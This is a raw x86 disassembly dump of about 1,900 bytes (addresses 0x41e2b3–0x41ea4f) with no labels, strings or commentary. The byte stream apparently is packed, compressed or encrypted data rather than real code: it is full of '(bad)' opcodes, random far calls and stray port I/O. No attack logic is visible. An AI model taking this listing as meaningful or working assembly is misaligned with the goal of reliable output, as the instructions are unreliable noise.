  41e2b3:	add    DWORD PTR [edi+0x6b],ebp
  41e2b6:	fucomp st(3)
  41e2b8:	push   ecx
  41e2b9:	push   ebp
  41e2ba:	add    al,bh
  41e2bc:	push   0xbfb2a3eb
  41e2c1:	jg     0x41e32d
  41e2c3:	mov    ah,0x6d
  41e2c5:	mov    esi,0xde6c42c7
  41e2ca:	fld    TBYTE PTR [eax-0x2aa1b879]
  41e2d0:	sbb    dl,BYTE PTR [eax+0x67]
  41e2d3:	jmp    0x41e299
  41e2d5:	mov    edi,0x2ede281a
  41e2da:	mov    dh,0x42
  41e2dc:	jnp    0x41e35a
  41e2de:	jg     0x41e2db
  41e2e0:	in     al,0xd8
  41e2e2:	call   0x7d03:0xb982b41c
  41e2e9:	xlat   BYTE PTR ds:[ebx]
  41e2ea:	or     dh,BYTE PTR [edi]
  41e2ec:	in     eax,0xec
  41e2ee:	cmc    
  41e2ef:	cwde   
  41e2f0:	icebp  
  41e2f1:	ins    BYTE PTR es:[edi],dx
  41e2f2:	ss enter 0x4654,0xe1
  41e2f7:	dec    ebx
  41e2f8:	push   ecx
  41e2f9:	mov    ds:0x595839a5,al
  41e2fe:	add    DWORD PTR [edi+ebp*8+0x18],esi
  41e302:	xchg   ebp,eax
  41e303:	push   esp
  41e304:	aaa    
  41e305:	mov    ds:0xeaf0c04,al
  41e30a:	enter  0x6c2e,0xe
  41e30e:	jp     0x41e300
  41e310:	ret    0x8dbb
  41e313:	pop    ebx
  41e314:	jb     0x41e377
  41e316:	cdq    
  41e317:	imul   ecx,edx,0x16
  41e31a:	popf   
  41e31b:	push   ebx
  41e31c:	jb     0x41e2e9
  41e31e:	outs   dx,BYTE PTR ds:[esi]
  41e31f:	and    al,0xa3
  41e321:	clc    
  41e322:	sub    eax,0x2ff0e532
  41e327:	jae    0x41e2b7
  41e329:	xchg   ebx,eax
  41e32a:	or     bh,al
  41e32c:	cmp    BYTE PTR [edi+0x39ac2f8],dh
  41e332:	push   es
  41e333:	mov    bh,BYTE PTR ds:0x7c876b27
  41e339:	mov    ds:0x72a18d,al
	...
  41e34a:	add    ah,dl
  41e34c:	sqrtps xmm6,xmm0
  41e34f:	(bad)  
  41e351:	cmc    
  41e352:	das    
  41e353:	sbb    BYTE PTR [eax],cl
  41e355:	xchg   ebx,eax
  41e356:	iret   
  41e357:	push   esi
  41e358:	xor    eax,0xa03f550d
  41e35d:	add    DWORD PTR [eax],eax
  41e35f:	stos   BYTE PTR es:[edi],al
  41e360:	add    BYTE PTR [eax],al
  41e362:	add    BYTE PTR [edi+0x27],bh
  41e365:	inc    esi
  41e366:	retf   0xaab5
  41e369:	mov    ebx,es
  41e36b:	ficom  DWORD PTR [ebx+0x2f]
  41e36e:	sub    DWORD PTR [edx],ebp
  41e370:	sub    BYTE PTR [ebp-0x4],dh
  41e373:	sub    edi,DWORD PTR [ecx+0x44]
  41e376:	scas   al,BYTE PTR es:[edi]
  41e377:	mov    esp,0x28816534
  41e37c:	cmc    
  41e37d:	retf   
  41e37e:	jmp    0xf36b43b4
  41e383:	push   es
  41e384:	and    BYTE PTR [edx+0x68],dl
  41e387:	aaa    
  41e388:	sub    BYTE PTR [ebx],cl
  41e38a:	dec    ebx
  41e38b:	adc    BYTE PTR [eax-0x441eb814],dl
  41e391:	push   es
  41e392:	retf   0x91b3
  41e395:	clc    
  41e396:	xlat   BYTE PTR ds:[ebx]
  41e397:	dec    esi
  41e398:	xchg   ebp,eax
  41e399:	test   DWORD PTR [eax+0x50],esi
  41e39c:	add    BYTE PTR [ebp+eax*2-0x7c0cad2f],0x72
  41e3a4:	outs   dx,DWORD PTR ds:[esi]
  41e3a5:	adc    BYTE PTR [ecx+0x74],bh
  41e3a8:	(bad)  
  41e3aa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e3ab:	push   edi
  41e3ac:	fistp  QWORD PTR [ebx]
  41e3ae:	push   ds
  41e3af:	push   esp
  41e3b0:	mov    DWORD PTR [eax-0x3a],esi
  41e3b3:	sbb    DWORD PTR [eax],ebx
  41e3b5:	mov    ecx,0xbb29d849
  41e3ba:	call   0xc835:0xd7b65315
  41e3c1:	add    dh,0xfc
  41e3c4:	jbe    0x41e444
  41e3c6:	icebp  
  41e3c7:	pop    ebp
  41e3c8:	xor    edi,DWORD PTR [eax+0x35]
  41e3cb:	mov    dl,0x69
  41e3cd:	mov    bh,0x4f
  41e3cf:	aad    0x12
  41e3d1:	add    bl,BYTE PTR ds:0x532706e7
  41e3d7:	lahf   
  41e3d8:	(bad)  
  41e3d9:	jo     0x41e3c1
  41e3db:	inc    edx
  41e3dc:	push   cs
  41e3dd:	ins    DWORD PTR es:[edi],dx
  41e3de:	dec    ebx
  41e3df:	xchg   esi,eax
  41e3e0:	dec    esp
  41e3e1:	(bad)  
  41e3e2:	(bad)  
  41e3e4:	out    0xa7,eax
  41e3e6:	jbe    0x41e3a6
  41e3e8:	inc    esi
  41e3e9:	test   al,0x6c
  41e3eb:	or     DWORD PTR [ecx-0x1e],ebp
  41e3ee:	jle    0x41e3b5
  41e3f0:	dec    esi
  41e3f1:	push   0x439b9a07
  41e3f6:	mov    dl,0x2c
  41e3f8:	push   0x1a792e3e
  41e3fd:	jge    0x41e3c7
  41e3ff:	sbb    BYTE PTR [ebx],cl
  41e401:	jle    0x41e40e
  41e403:	and    BYTE PTR [ebx],bh
  41e405:	xchg   edi,eax
  41e406:	out    dx,eax
  41e407:	fstp   QWORD PTR [edi+0x29ace73d]
	...
  41e419:	add    BYTE PTR [eax],al
  41e41b:	int    0x2d
  41e41d:	xchg   ebp,eax
  41e41e:	inc    ebx
  41e41f:	cmc    
  41e420:	sti    
  41e421:	fild   QWORD PTR [edi-0x5bdf5fa9]
  41e427:	push   ss
  41e428:	imul   ebp,DWORD PTR [edi+0x1a0e9b8],0x0
  41e42f:	stos   BYTE PTR es:[edi],al
  41e430:	add    BYTE PTR [eax],al
  41e432:	add    BYTE PTR [esi],cl
  41e434:	mov    ebx,0x279ef661
  41e439:	mov    edi,0xd84d335a
  41e43e:	clc    
  41e43f:	xchg   esp,eax
  41e440:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e441:	cmp    bh,0xcc
  41e444:	fldenv [eax+0x33]
  41e447:	sbb    cl,BYTE PTR [ebx+0x3a]
  41e44a:	sbb    ch,BYTE PTR [esi+0x74]
  41e44d:	mov    ds:0x8eef042e,al
  41e452:	inc    edi
  41e453:	dec    ebx
  41e454:	xchg   BYTE PTR [ebx-0x79],bh
  41e457:	imul   esi,ebx,0x434cbd21
  41e45d:	(bad)  
  41e45e:	mov    eax,0x623b7a40
  41e463:	sahf   
  41e464:	dec    ecx
  41e465:	popf   
  41e466:	addr16 cdq 
  41e468:	out    0xa1,al
  41e46a:	jg     0x41e440
  41e46c:	xor    DWORD PTR [edi],esp
  41e46e:	retf   0xa4ee
  41e471:	inc    edi
  41e472:	daa    
  41e473:	xchg   edi,eax
  41e474:	test   eax,0xfe3a350a
  41e479:	(bad)  
  41e47a:	retf   0xfb62
  41e47d:	adc    cl,dl
  41e47f:	in     eax,0x17
  41e481:	packuswb mm5,mm1
  41e484:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e485:	jl     0x41e40b
  41e487:	and    eax,0x81aa70ce
  41e48c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e48d:	fsubr  QWORD PTR [edx+eax*2+0x5a]
  41e491:	and    ecx,DWORD PTR [edx]
  41e493:	mov    al,0xa0
  41e495:	fisub  DWORD PTR [edi]
  41e497:	xor    BYTE PTR [ecx+eiz*1+0xd885b4f],dh
  41e49e:	sbb    al,0xb6
  41e4a0:	pushf  
  41e4a1:	jae    0x41e43f
  41e4a3:	xor    eax,0xbfc84438
  41e4a8:	std    
  41e4a9:	out    0x30,eax
  41e4ab:	push   esi
  41e4ac:	(bad)  
  41e4ad:	jmp    DWORD PTR [eax-0x6d75fd71]
  41e4b3:	fistp  QWORD PTR [edi]
  41e4b5:	sub    ch,BYTE PTR [eax-0x6e]
  41e4b8:	mov    al,0xbf
  41e4ba:	inc    eax
  41e4bb:	outs   dx,BYTE PTR ds:[esi]
  41e4bc:	addr16 ret 0xf331
  41e4c0:	loope  0x41e4c5
  41e4c2:	or     ebp,edi
  41e4c4:	jp     0x41e489
  41e4c6:	xlat   BYTE PTR ds:[ebx]
  41e4c7:	enter  0x1ad2,0xb8
  41e4cb:	xchg   bh,cl
  41e4cd:	inc    eax
  41e4ce:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e4cf:	and    BYTE PTR [edi+0x3e91ed66],0x67
  41e4d6:	stos   BYTE PTR es:[edi],al
  41e4d7:	or     al,0x31
  41e4d9:	jge    0x41e552
  41e4db:	xchg   edi,eax
  41e4dc:	add    eax,0x0
	...
  41e4e9:	add    BYTE PTR [eax],al
  41e4eb:	adc    esp,DWORD PTR [edi+eiz*8+0xb]
  41e4ef:	test   DWORD PTR [ebx-0xce58301],0x98f54cfc
  41e4f9:	push   ds
  41e4fa:	bound  edx,QWORD PTR [ebx-0x55fffe5f]
  41e500:	add    BYTE PTR [eax],al
  41e502:	add    BYTE PTR [ecx+edi*4-0x2e],cl
  41e506:	sti    
  41e507:	jle    0x41e4d1
  41e509:	das    
  41e50a:	xor    bl,BYTE PTR [eax+ebx*2-0x7e]
  41e50e:	lods   al,BYTE PTR ds:[esi]
  41e50f:	ja     0x41e534
  41e511:	sub    DWORD PTR [eax],esp
  41e513:	push   eax
  41e514:	xchg   ebx,esp
  41e516:	lods   al,BYTE PTR ds:[esi]
  41e517:	ins    DWORD PTR es:[edi],dx
  41e518:	fild   WORD PTR [esi]
  41e51a:	mov    dh,0x90
  41e51c:	jecxz  0x41e51c
  41e51e:	mov    cl,0x68
  41e520:	fxam   
  41e522:	xor    edi,DWORD PTR [ebx]
  41e524:	sbb    ecx,DWORD PTR [edi]
  41e526:	scas   al,BYTE PTR es:[edi]
  41e527:	mov    cl,0x9f
  41e529:	(bad)  
  41e52a:	aam    0xab
  41e52c:	lods   al,BYTE PTR ds:[esi]
  41e52d:	xchg   BYTE PTR [eax-0x119aff9b],ch
  41e533:	stc    
  41e534:	stc    
  41e535:	adc    esi,esi
  41e537:	and    eax,0xa354744
  41e53c:	push   0xffffffe2
  41e53e:	rol    BYTE PTR [ecx-0x277b4cd0],1
  41e544:	cmp    al,0xba
  41e546:	sar    BYTE PTR [edx+0x668beb94],0x1a
  41e54d:	cld    
  41e54e:	pusha  
  41e54f:	rcr    DWORD PTR [ebp+0x62cac717],0xc5
  41e556:	(bad)  
  41e557:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e558:	xor    BYTE PTR [ebp+0x3893a028],al
  41e55e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e55f:	inc    eax
  41e560:	jnp    0x41e54e
  41e562:	inc    si
  41e564:	mov    dh,0x5b
  41e566:	sbb    esp,DWORD PTR [ecx]
  41e568:	ins    BYTE PTR es:[edi],dx
  41e569:	push   ecx
  41e56a:	inc    ebx
  41e56b:	cmp    dl,cl
  41e56d:	inc    ebp
  41e56e:	sub    BYTE PTR [ecx-0x72],dh
  41e571:	inc    edi
  41e572:	clc    
  41e573:	or     edx,ecx
  41e575:	sbb    eax,DWORD PTR [edi-0x22]
  41e578:	dec    eax
  41e579:	add    eax,0xf379949e
  41e57e:	ret    0x8ca3
  41e581:	int    0xa3
  41e583:	repnz and DWORD PTR [eax],eax
  41e586:	cmp    ah,ch
  41e588:	mov    ebp,0x5bd5cbb6
  41e58d:	jo     0x41e607
  41e58f:	push   edx
  41e590:	shl    ch,cl
  41e592:	enter  0x1a86,0xca
  41e596:	add    dh,bl
  41e598:	mov    ss:0x3c9c9b3,eax
  41e59e:	push   eax
  41e59f:	rcr    DWORD PTR [ecx-0x68767f9e],1
  41e5a5:	and    BYTE PTR [edi-0x5d],bl
  41e5a8:	push   esi
  41e5a9:	cmp    bh,BYTE PTR cs:[ecx]
  41e5ac:	cmp    BYTE PTR [eax],al
	...
  41e5ba:	add    BYTE PTR [edi],ah
  41e5bc:	push   ecx
  41e5bd:	imul   esi,DWORD PTR [ecx-0x28004681],0x8274b3d8
  41e5c7:	cmc    
  41e5c8:	and    ebx,DWORD PTR [eax+ecx*1+0x1a23d]
  41e5cf:	stos   BYTE PTR es:[edi],al
  41e5d0:	add    BYTE PTR [eax],al
  41e5d2:	add    BYTE PTR [esi-0x59],cl
  41e5d5:	out    dx,al
  41e5d6:	and    DWORD PTR [edi+0xf],edx
  41e5d9:	push   ds
  41e5da:	xchg   BYTE PTR [edx-0x27],dl
  41e5dd:	jecxz  0x41e5a3
  41e5df:	pop    ss
  41e5e0:	cmp    BYTE PTR [edx-0x61],bl
  41e5e3:	adc    eax,0x8c75bd22
  41e5e8:	xchg   edi,eax
  41e5e9:	jmp    0x41e5d0
  41e5eb:	mov    esp,0xcada75f4
  41e5f0:	sbb    bh,BYTE PTR [edx+0x264b1470]
  41e5f6:	js     0x41e5c1
  41e5f8:	test   eax,0xf5c5d376
  41e5fd:	in     eax,dx
  41e5fe:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e5ff:	mov    ebp,0x9eb8688
  41e604:	jb     0x41e599
  41e606:	sbb    al,0x8a
  41e608:	bound  ebx,QWORD PTR [esi-0x22]
  41e60b:	mov    dh,0x4b
  41e60d:	xchg   ebp,eax
  41e60e:	inc    esi
  41e60f:	ror    DWORD PTR ds:0xe3cb034f,1
  41e615:	popa   
  41e616:	pop    ds
  41e617:	scas   al,BYTE PTR es:[edi]
  41e618:	sbb    ebp,DWORD PTR [ebp+0x21576395]
  41e61e:	push   0xb2724cf0
  41e623:	idiv   DWORD PTR [eax+0x7d]
  41e626:	sbb    esp,DWORD PTR [edi-0x41a46609]
  41e62c:	add    BYTE PTR [edx-0x17],al
  41e62f:	add    eax,0x3dcf6719
  41e634:	mov    ch,0x5c
  41e636:	stos   BYTE PTR es:[edi],al
  41e637:	pop    ebp
  41e638:	mov    dh,0x7f
  41e63a:	pop    esp
  41e63b:	mov    al,ds:0x7ebf6393
  41e640:	pop    ds
  41e641:	sub    al,0xaf
  41e643:	inc    esp
  41e644:	adc    eax,0xd5c7b2c1
  41e649:	arpl   WORD PTR [edi+ecx*8+0x48c75003],di
  41e650:	jp     0x41e691
  41e652:	sub    eax,DWORD PTR [ebp-0x7ba74b3d]
  41e658:	dec    ebp
  41e659:	jge    0x41e625
  41e65b:	sub    al,0x5c
  41e65d:	in     eax,0x36
  41e65f:	fdiv   DWORD PTR [edi+0x17de100d]
  41e665:	push   edi
  41e666:	xlat   BYTE PTR ds:[ebx]
  41e667:	jg     0x41e5e9
  41e669:	fcomi  st,st(4)
  41e66b:	sbb    edx,DWORD PTR [edi+0x73]
  41e66e:	aaa    
  41e66f:	or     DWORD PTR [edi-0x74],ebx
  41e672:	mov    ecx,0xc6e66ee6
  41e677:	cmp    DWORD PTR [ebx+0x4f],edx
  41e67a:	cdq    
  41e67b:	xchg   ebp,eax
  41e67c:	push   cs
	...
  41e689:	add    BYTE PTR [eax],al
  41e68b:	add    dl,BYTE PTR ss:[ebp+0xc]
  41e68f:	jne    0x41e6f0
  41e691:	jg     0x41e6cd
  41e693:	clc    
  41e694:	cs aas 
  41e696:	push   0xd0e2e68a
  41e69b:	push   ebp
  41e69c:	mov    al,BYTE PTR [ecx]
  41e69e:	add    BYTE PTR [edx-0x77000000],ch
  41e6a4:	sbb    ch,dl
  41e6a6:	jno    0x41e69f
  41e6a8:	and    ch,cl
  41e6aa:	fimul  WORD PTR [ecx+0x1e]
  41e6ad:	mov    dl,0xf
  41e6af:	jmp    0xdba59369
  41e6b4:	push   cs
  41e6b5:	sahf   
  41e6b6:	outs   dx,DWORD PTR ds:[esi]
  41e6b7:	ficomp DWORD PTR [esi+0x2abb143d]
  41e6bd:	adc    al,0xb
  41e6bf:	jl     0x41e71b
  41e6c1:	ret    
  41e6c2:	fadd   DWORD PTR [eax+0x2]
  41e6c5:	adc    al,0xf3
  41e6c7:	jg     0x41e682
  41e6c9:	jle    0x41e6a3
  41e6cb:	ss mov bh,0x60
  41e6ce:	lods   eax,DWORD PTR ds:[esi]
  41e6cf:	jp     0x41e689
  41e6d1:	shr    BYTE PTR [ecx+0xc],cl
  41e6d4:	fnstcw WORD PTR [edi-0x69]
  41e6d7:	das    
  41e6d8:	scas   al,BYTE PTR es:[edi]
  41e6d9:	xor    BYTE PTR [ebx+0x1f4ed307],dh
  41e6df:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e6e0:	or     cl,cl
  41e6e2:	(bad)  
  41e6e3:	push   0xc05969c5
  41e6e8:	push   0x75
  41e6ea:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e6eb:	aam    0x7e
  41e6ed:	mov    DWORD PTR [ecx],ecx
  41e6ef:	mov    edx,0x13476db1
  41e6f4:	test   DWORD PTR ds:0x1af414f3,esp
  41e6fa:	xor    cl,BYTE PTR [ebp-0x78]
  41e6fd:	ss jg  0x41e684
  41e700:	mov    DWORD PTR [ebx+0x44a9d3da],ebp
  41e706:	fsub   st(3),st
  41e708:	dec    edi
  41e709:	(bad)  
  41e70b:	(bad)  
  41e70c:	push   0x9e875b82
  41e711:	ja     0x41e73c
  41e713:	fsubr  QWORD PTR [ecx]
  41e715:	ins    DWORD PTR es:[edi],dx
  41e716:	dec    edi
  41e717:	xchg   ecx,eax
  41e718:	stos   BYTE PTR es:[edi],al
  41e719:	iret   
  41e71a:	push   ebp
  41e71b:	sub    DWORD PTR [esi+0x4418584],ecx
  41e721:	pop    esi
  41e722:	int    0x5f
  41e724:	repz pusha 
  41e726:	mov    ecx,0xf7522fd4
  41e72b:	sahf   
  41e72c:	and    BYTE PTR [esi],ch
  41e72e:	pop    ebp
  41e72f:	call   0xcd1c68dc
  41e734:	jo     0x41e760
  41e736:	mov    eax,ds:0x612f3b1d
  41e73b:	mov    ds:0xfed344fd,eax
  41e740:	pop    esp
  41e741:	fnstenv [ebp+0x5aeeea1a]
  41e747:	dec    esp
  41e748:	(bad)  
  41e749:	ror    DWORD PTR [ebp+0x90af],cl
	...
  41e75b:	or     BYTE PTR [ecx-0x404c48e],dh
  41e761:	dec    ecx
  41e762:	mov    bl,0x94
  41e764:	je     0x41e73d
  41e766:	call   0x8aff:0xefec1bcb
  41e76d:	add    DWORD PTR [eax],eax
  41e76f:	stos   BYTE PTR es:[edi],al
  41e770:	add    BYTE PTR [eax],al
  41e772:	add    BYTE PTR ds:0xb9d98e3b,ah
  41e778:	jae    0x41e797
  41e77a:	push   ebp
  41e77b:	dec    ebp
  41e77c:	(bad)  
  41e77d:	out    0x2a,al
  41e77f:	enter  0xdfac,0x91
  41e783:	lods   al,BYTE PTR ds:[esi]
  41e784:	cmp    bh,ch
  41e786:	adc    al,0x51
  41e788:	cmp    eax,0x615ccb1b
  41e78d:	scas   eax,DWORD PTR es:[edi]
  41e78e:	dec    edi
  41e78f:	xor    DWORD PTR [ecx-0x54],esi
  41e792:	mov    bl,0x92
  41e794:	ret    0xe0bc
  41e797:	mov    ds:0x759ecc1c,eax
  41e79c:	in     eax,0x28
  41e79e:	mov    eax,0x5e7b9cd8
  41e7a3:	jp     0x41e782
  41e7a5:	sub    al,dh
  41e7a7:	inc    esi
  41e7a8:	mov    ds,WORD PTR ds:0x5d8fde9
  41e7ae:	es jns 0x41e765
  41e7b1:	mov    ah,0x15
  41e7b3:	mov    dh,0x8b
  41e7b5:	fild   WORD PTR [edi+0x19a652a]
  41e7bb:	bound  eax,QWORD PTR [ecx+ebx*4-0x58]
  41e7bf:	mov    esp,0x2fc24867
  41e7c4:	mov    ds:0xb0e82261,eax
  41e7c9:	loop   0x41e846
  41e7cb:	xchg   DWORD PTR [ebx],edi
  41e7cd:	fist   DWORD PTR [esp+esi*1-0x2339d97e]
  41e7d4:	ret    0xb8e
  41e7d7:	ins    BYTE PTR es:[edi],dx
  41e7d8:	xchg   edi,eax
  41e7d9:	adc    ebp,ebp
  41e7db:	(bad)  
  41e7dc:	dec    ebp
  41e7dd:	popf   
  41e7de:	mov    esp,0xf092f0f1
  41e7e3:	jae    0x41e830
  41e7e5:	je     0x41e7e8
  41e7e7:	bound  ecx,QWORD PTR [edi+0x2c]
  41e7ea:	add    dl,ah
  41e7ec:	push   eax
  41e7ed:	push   eax
  41e7ee:	clc    
  41e7ef:	or     ah,ch
  41e7f1:	test   al,0xfc
  41e7f3:	push   cs
  41e7f4:	xchg   esi,eax
  41e7f5:	leave  
  41e7f6:	dec    edx
  41e7f7:	dec    eax
  41e7f8:	dec    ebp
  41e7f9:	fbstp  TBYTE PTR [esi+eax*1]
  41e7fc:	fcomp  QWORD PTR [edx+0x79]
  41e7ff:	ret    
  41e800:	push   esp
  41e801:	shl    DWORD PTR [edi-0x586c1009],0x89
  41e808:	cdq    
  41e809:	jecxz  0x41e860
  41e80b:	mov    esp,0x6e3e7b17
  41e810:	(bad)  
  41e811:	sbb    edx,DWORD PTR [ecx+0x42162dfa]
  41e817:	pushf  
  41e818:	inc    esp
  41e819:	aaa    
  41e81a:	aam    0xee
  41e81c:	push   esp
	...
  41e829:	add    BYTE PTR [eax],al
  41e82b:	fist   WORD PTR [ebx-0x4e]
  41e82e:	dec    edi
  41e82f:	mov    esi,0x67d3ffef
  41e834:	xchg   ecx,edi
  41e836:	adc    al,0xaa
  41e838:	mov    al,ds:0x8ba96077
  41e83d:	add    DWORD PTR [eax],eax
  41e83f:	stos   BYTE PTR es:[edi],al
  41e840:	add    BYTE PTR [eax],al
  41e842:	add    ah,bh
  41e844:	dec    ecx
  41e845:	and    BYTE PTR [esi+0x2367c13b],bh
  41e84b:	popf   
  41e84c:	jno    0x41e896
  41e84e:	sbb    cl,BYTE PTR [edi+esi*2-0x4c]
  41e852:	stc    
  41e853:	xchg   ebp,eax
  41e854:	fs add ch,dh
  41e857:	and    al,0x99
  41e859:	and    bh,dh
  41e85b:	push   ss
  41e85c:	mov    eax,edx
  41e85e:	loope  0x41e8b9
  41e860:	dec    edx
  41e861:	es call 0x4536e509
  41e867:	push   eax
  41e868:	add    al,0x9b
  41e86a:	in     eax,0x26
  41e86c:	add    BYTE PTR [edx-0x1a660719],bl
  41e872:	loopne 0x41e850
  41e874:	popa   
  41e875:	xchg   BYTE PTR [ecx],ah
  41e877:	ret    0xbe78
  41e87a:	cli    
  41e87b:	pop    ebx
  41e87c:	outs   dx,BYTE PTR ds:[esi]
  41e87d:	lock pop edi
  41e87f:	mov    DWORD PTR [esp+ebx*2+0x39],edi
  41e883:	inc    edx
  41e884:	mov    ebx,fs
  41e886:	cmp    ah,BYTE PTR [eax+ebx*8-0x1e4a3085]
  41e88d:	mov    ebp,DWORD PTR [esi+0x24dc8bfa]
  41e893:	dec    edx
  41e894:	sbb    cl,cl
  41e896:	add    al,0xf5
  41e898:	inc    ecx
  41e899:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e89a:	loop   0x41e83b
  41e89c:	push   ds
  41e89d:	loopne 0x41e906
  41e89f:	push   0xffffff85
  41e8a1:	add    dl,0x96
  41e8a4:	popa   
  41e8a5:	mov    BYTE PTR [ebx+0x47],dh
  41e8a8:	mov    cl,BYTE PTR [edx]
  41e8aa:	dec    esp
  41e8ab:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e8ac:	sbb    eax,0x1bbd1ade
  41e8b1:	inc    edi
  41e8b2:	or     esp,DWORD PTR [esi+ecx*1]
  41e8b5:	inc    esi
  41e8b6:	shl    DWORD PTR [eax+0x59295c61],cl
  41e8bc:	mov    dh,0x68
  41e8be:	mov    edi,0xada425ed
  41e8c3:	xor    cl,ch
  41e8c5:	pushf  
  41e8c6:	mov    eax,0x962af937
  41e8cb:	dec    ecx
  41e8cc:	jecxz  0x41e8bc
  41e8ce:	push   esp
  41e8cf:	pop    eax
  41e8d0:	mov    cl,0x96
  41e8d2:	shl    DWORD PTR [edi],0xc9
  41e8d5:	shr    BYTE PTR [edi+ecx*2],1
  41e8d8:	cdq    
  41e8d9:	adc    dl,dh
  41e8db:	cmp    BYTE PTR [edi-0x23],bl
  41e8de:	mov    edx,0xe82112cd
  41e8e3:	lock (bad) 
  41e8e5:	imul   esi,ebp,0x37842add
  41e8eb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e8ec:	xchg   BYTE PTR [eax],al
	...
  41e8fa:	add    BYTE PTR [edi-0x24252cf4],al
  41e900:	fisttp WORD PTR [edi+0x640ccb5d]
  41e906:	push   ss
  41e907:	mov    ah,0xc7
  41e909:	jno    0x41e90b
  41e90b:	push   ebx
  41e90c:	mov    WORD PTR [ecx],es
  41e90e:	add    BYTE PTR [edx-0xe000000],ch
  41e914:	sbb    edx,DWORD PTR [ecx]
  41e916:	daa    
  41e917:	sar    esi,0x41
  41e91a:	add    al,0x1c
  41e91c:	ins    DWORD PTR es:[edi],dx
  41e91d:	cmp    eax,0x4951dfa8
  41e922:	jo     0x41e917
  41e924:	mul    BYTE PTR [ebx]
  41e926:	pop    eax
  41e927:	mov    BYTE PTR [ebp-0x3942d4b],dh
  41e92d:	stos   BYTE PTR es:[edi],al
  41e92e:	xor    ah,ah
  41e930:	cli    
  41e931:	pop    ebx
  41e932:	xchg   ebx,eax
  41e933:	or     al,0xc7
  41e935:	(bad)  
  41e937:	jecxz  0x41e92f
  41e939:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e93a:	jnp    0x41e904
  41e93c:	mov    ss,edx
  41e93e:	neg    DWORD PTR [ebp-0x6dc321de]
  41e944:	cli    
  41e945:	test   DWORD PTR [esi],esp
  41e947:	int    0x76
  41e949:	sub    eax,0xcb60a558
  41e94e:	inc    ecx
  41e94f:	or     al,bl
  41e951:	xor    eax,0x893750b6
  41e956:	idiv   edx
  41e958:	nop
  41e959:	xchg   edi,eax
  41e95a:	es leave 
  41e95c:	fisub  WORD PTR ds:[edi+0x5ab5d3ab]
  41e963:	in     eax,dx
  41e964:	push   eax
  41e965:	jnp    0x41e918
  41e967:	dec    edi
  41e968:	add    ah,BYTE PTR [esi+0x416dfcee]
  41e96e:	loopne 0x41e9c0
  41e970:	jl     0x41e994
  41e972:	dec    ecx
  41e973:	call   0x6802b240
  41e978:	dec    ebx
  41e979:	add    eax,0x7b21cf6c
  41e97e:	push   esp
  41e97f:	pop    eax
  41e980:	fldcw  WORD PTR [esi-0x4f]
  41e983:	(bad)  
  41e984:	mov    DWORD PTR [edx+0x3412f889],ebp
  41e98a:	xor    ebp,eax
  41e98c:	or     al,0xb4
  41e98e:	(bad)  
  41e98f:	retf   0xc4c0
  41e992:	dec    ebx
  41e993:	xchg   ebp,eax
  41e994:	or     al,0xbf
  41e996:	dec    eax
  41e997:	pop    esi
  41e998:	mov    ds:0x1eb1af76,al
  41e99d:	mov    dh,0x7c
  41e99f:	fiadd  WORD PTR [esi]
  41e9a1:	dec    ecx
  41e9a2:	dec    edx
  41e9a3:	(bad)  
  41e9a4:	not    esp
  41e9a6:	xchg   DWORD PTR [esi-0x78772ca],ecx
  41e9ac:	dec    ebp
  41e9ad:	cwde   
  41e9ae:	(bad)  
  41e9af:	mov    WORD PTR ds:0xf7a1a0f5,cs
  41e9b5:	mul    DWORD PTR [ebp+0x4c]
  41e9b8:	aaa    
  41e9b9:	sub    bl,BYTE PTR [ebp+esi*4+0xbc]
	...
  41e9c8:	add    BYTE PTR [eax],al
  41e9ca:	add    BYTE PTR [edi-0x28db29d],bl
  41e9d0:	jle    0x41e991
  41e9d2:	out    dx,eax
  41e9d3:	sbb    edi,esp
  41e9d5:	mov    BYTE PTR [ebx+edx*1-0x27cdcec],dh
  41e9dc:	mov    WORD PTR [ecx],es
  41e9de:	add    BYTE PTR [edx-0x15000000],ch
  41e9e4:	arpl   WORD PTR [esi],ax
  41e9e6:	iret   
  41e9e7:	clc    
  41e9e8:	hlt    
  41e9e9:	in     al,dx
  41e9ea:	jno    0x41e9e4
  41e9ec:	dec    edi
  41e9ed:	(bad)  
  41e9ee:	jle    0x41e982
  41e9f0:	sub    ebx,DWORD PTR [ecx]
  41e9f2:	jl     0x41ea31
  41e9f4:	stos   DWORD PTR es:[edi],eax
  41e9f5:	rcr    DWORD PTR [edi-0x2265e069],cl
  41e9fb:	lods   al,BYTE PTR ds:[esi]
  41e9fc:	cs jmp 0xe903:0x4cfb8376
  41ea04:	and    eax,0x503bcf2e
  41ea09:	push   ss
  41ea0a:	ds sahf 
  41ea0c:	jne    0x41ea28
  41ea0e:	ret    
  41ea0f:	loopne 0x41e9f2
  41ea11:	push   es
  41ea12:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ea13:	stos   DWORD PTR es:[edi],eax
  41ea14:	mov    ?,WORD PTR ds:[esi]
  41ea17:	inc    eax
  41ea18:	jns    0x41ea53
  41ea1a:	ds push eax
  41ea1c:	clc    
  41ea1d:	addr16 inc eax
  41ea1f:	mov    ebx,0xad32f331
  41ea24:	data16 (bad) 
  41ea26:	cld    
  41ea27:	sbb    esp,0x33
  41ea2a:	mov    edi,0x8f9dc9ec
  41ea2f:	(bad)  [eax+0x5edbc8d3]
  41ea35:	ins    DWORD PTR es:[edi],dx
  41ea36:	dec    ecx
  41ea37:	iret   
  41ea38:	inc    edi
  41ea39:	or     ebx,DWORD PTR [edx]
  41ea3b:	imul   esp,DWORD PTR [ebp-0xc336275],0x4766661
  41ea45:	pop    esp
  41ea46:	fcmovnb st,st(1)
  41ea48:	push   es
  41ea49:	cdq    
  41ea4a:	jg     0x41ea0a
  41ea4c:	fistp  DWORD PTR [edi]
  41ea4e:	push   ecx
  41ea4f:	out    0xe7,al
